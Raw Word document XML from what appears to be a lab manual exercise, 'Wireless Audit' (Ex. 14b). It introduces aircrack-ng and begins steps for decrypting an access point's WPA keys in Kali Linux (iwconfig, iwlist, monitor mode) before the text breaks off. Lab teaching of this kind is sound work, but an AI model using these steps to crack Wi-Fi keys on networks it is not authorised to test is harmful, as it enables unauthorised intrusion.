        <w:spacing w:before="2" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="219"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>e wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ows for heavy scr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">UIs have </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>aken adva</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">age of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s fea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e. It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>orks pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nux but</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ndows, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">S X, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t>reeBSD, OpenBSD, Ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>D, as we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as So</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and even eCo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>2.</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3" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="8873"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="102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804" w:right="1295" w:hanging="3704"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 14b                                                                                                         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IRELE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UDIT</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10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100" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8850"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o perform</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ess aud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>Access Po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>decrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-24"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>keys us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>rc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">ack-ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nux O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>gor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>thm:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>1.  Ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ck </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>current</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>ace</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>wconf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:t>and.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2.  Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>channel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, MAC address and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>SS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>D w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>and.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3.  S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>art</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>erface</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>pe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>AP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>chann</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
